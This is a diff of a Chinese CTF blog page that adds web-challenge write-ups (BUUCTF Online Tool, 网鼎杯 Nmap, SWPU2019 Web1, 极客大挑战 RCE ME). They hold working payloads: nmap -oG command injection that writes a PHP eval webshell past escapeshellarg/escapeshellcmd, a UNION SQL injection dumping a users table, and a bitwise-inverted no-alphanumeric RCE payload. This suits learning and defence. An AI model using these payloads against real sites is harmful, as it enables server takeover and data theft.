@@ -30,7 +30,7 @@
 <meta property="og:description" content="web≈0 零碎记录些做的web题">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-12-28T11:26:48.000Z">
-<meta property="article:modified_time" content="2023-12-31T07:52:23.417Z">
+<meta property="article:modified_time" content="2024-01-05T03:34:57.692Z">
 <meta property="article:author" content="ULGANOY">
 <meta name="twitter:card" content="summary">
 
@@ -223,7 +223,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-12-31 15:52:23" itemprop="dateModified" datetime="2023-12-31T15:52:23+08:00">2023-12-31</time>
+                <time title="修改时间：2024-01-05 11:34:57" itemprop="dateModified" datetime="2024-01-05T11:34:57+08:00">2024-01-05</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -248,14 +248,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>758</span>
+              <span>2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -301,6 +301,54 @@
 <p>发现能够绕过</p>
 <h2 id="2-3"><a href="#2-3" class="headerlink" title="2 . 3"></a>2 . 3</h2><p>由于我们需要传一个英文字符串 但题目又进行了过滤<br>这里学到了一个小trick<br>$_REQUEST同时接收get和post请求 且post的优先级高于get<br>也就是说我们post&#x2F;get同时传同一个名字的变量 $REQUEST会处理post的<br>所以可以用这种方式绕过</p>
 <p>怎么绕过pregmatch+!&#x3D;&#x3D; ?<br>注意到这个preg_match是匹配开头结尾<br>可以在字符串最后加一个%0a换行符即可</p>
+<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>考察点: nmap命令+escapexxx组合逃逸</p>
+<p>靶机源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="nmap-oG"><a href="#nmap-oG" class="headerlink" title="nmap -oG"></a>nmap -oG</h2><p>nmap在RCE中有个独特的用法<br>可以用 -oG 来将命令写入文件<br>比如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27;&lt;?php    eval($_POST[&quot;hack&quot;]);?&gt; -oG hack3.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以将一句话木马写入.php<br>这题另外一个考点在于escapeshellarg和escapeshellcmd组合过滤的绕过<br>这种看官方文档</p>
+<h2 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg() 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec()、system() 和执行运算符 。</span><br><span class="line"></span><br><span class="line">在 Windows 上，escapeshellarg() 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(\)都会被一个额外的反斜线所转义。</span><br></pre></td></tr></table></figure>
+
+<h2 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line"></span><br><span class="line">反斜线（\）会在以下字符之前插入：&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\、\x0A 和 \xFF。 &#x27; 和 &quot; 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符前面都有一个插入符号（^）。</span><br></pre></td></tr></table></figure>
+
+<p>这两者结合起来的绕过方法就是在单引号前&#x2F;后增加空格<br>虽说我本地测试没看出任何区别… Windows下他会加上^所以看不出来</p>
+<p>所以这么传payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php eval($_POST[&quot;hack&quot;]);?&gt; -oG hack3.php &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后得到md5的dir 访问dir下的hack3.php post或者蚁剑都可以RCE</p>
+<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>与上一题相似的考点<br>题目给了一个nmap扫描接口 测试127.0.0.1发现与正常nmap扫描一样</p>
+<p>同样的 利用 -oG 写入木马<br>但是发现被检测到了 hacker…<br>尝试用短标签&#x2F;.phtml后缀 发现还是不行<br>想到上一题是用 单引号+空格绕过两个escape<br>猜测这后端也使用了两个escape来 “保证安全”<br>所以payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= @eval($_POST[1]); ?&gt;  -oG hack.phtml &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 &#x2F;hack.phtml 发现成功写入 一键RCE即可</p>
+<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019 ]Web1"></a>[SWPU2019 ]Web1</h1><p>orz<br>题目给了个登陆界面 尝试下弱密码&#x2F;万能绕过 都无果<br>发现可以注册 注册登陆后是一个可以发送广告的页面<br>尝试xxs 广告内容写</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&quot;233&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现申请后会有alert 试了试alert document.cookie 并没有flag</p>
+<p>注意到点击广告详情会得到这样的url </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b72e1f09-61f8-4bd9-a932-5fcae1df0ae0.node5.buuoj.cn:81/detail.php?id=5</span><br></pre></td></tr></table></figure>
+
+<p>这里要联想到sql 只是这里不是在id上注入<br>可以看<a href="https://blog.csdn.net/satasun/article/details/109391116" target="_blank">这篇</a><br>想想?id&#x3D;xxx 是怎么来的? 肯定不是直接从我们的广告信息读取的 发现是从1开始的cnt累加<br>那么就存在一个数据库查询的过程<br>select ID from xxx where name &#x3D; ad’s_name</p>
+<p>而广告名是可控点 所以存在sql注入的可能性<br>后面的sql注入绕过姿势挺复杂的 等再系统学了sql再来看</p>
+<p>最后构造的广告名:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>考点: 无数字字母RCE+蚁剑插件绕过disable_functions(Linux下)</p>
+<p>题目源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看<a href="https://www.cnblogs.com/pursue-security/p/15404150.html" target="_blank">这篇</a></p>
+<p>核心思想就是利用非字母数字来通过异或&#x2F;取反&#x2F;自增来拼接出如assert之类的可动态执行的函数<br>关于assert: 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
+<p>回到这题<br>我们尝试下取反<br>比如phpinfo取反 %8F%97%8F%96%91%99%90<br>那么构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<p>就可以执行 这里利用了动态特性 注意加括号<br>构造一句话木马: 这里不能直接用eval 因为eval不是php函数 无法通过变量函数的方法进行调用 所以要用assert<br>同样的因为php版本 我们不能直接assert($_POST[xxx]) 而需要 assert(eval($_POST[xxx]))</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert取反: %<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B</span><br><span class="line">(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]))取反: %D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%DD%<span class="number">97</span>%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">94</span>%DD%A2%D6%D6</span><br><span class="line">payload: ?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%DD%<span class="number">97</span>%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">94</span>%DD%A2%D6%D6);</span><br><span class="line"><span class="comment">// 注意结尾分号！</span></span><br></pre></td></tr></table></figure>
+
+<p>这样蚁剑连接后发现什么命令都执行不了<br>这里用蚁剑的dsiabe_functions插件 只是必须在Linux下执行<br>所以Linux下也要安装蚁剑<br>有点麻烦 过段时间再来搞…</p>
 
     </div>
 
@@ -403,7 +451,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="nav-text">[CISCN 2019 初赛]Love Math</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FireshellCTF2020-Caas"><span class="nav-text">[FireshellCTF2020 ]Caas</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF-EasyBypass"><span class="nav-text">[BUUCTF ] EasyBypass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-EzPHP"><span class="nav-text">[BJDCTF2020 ]EzPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-text">1.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3"><span class="nav-text">2 . 3</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="nav-text">[CISCN 2019 初赛]Love Math</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FireshellCTF2020-Caas"><span class="nav-text">[FireshellCTF2020 ]Caas</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF-EasyBypass"><span class="nav-text">[BUUCTF ] EasyBypass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-EzPHP"><span class="nav-text">[BJDCTF2020 ]EzPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-text">1.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3"><span class="nav-text">2 . 3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-text">[BUUCTF 2018]Online Tool</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap-oG"><span class="nav-text">nmap -oG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#escapeshellarg"><span class="nav-text">escapeshellarg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#escapeshellcmd"><span class="nav-text">escapeshellcmd</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="nav-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPU2019-Web1"><span class="nav-text">[SWPU2019 ]Web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="nav-text">[极客大挑战 2019]RCE ME</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -466,12 +514,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">54k</span>
+    <span title="站点总字数">56k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:39</span>
+    <span title="站点阅读时长">1:43</span>
 </div>
 
         
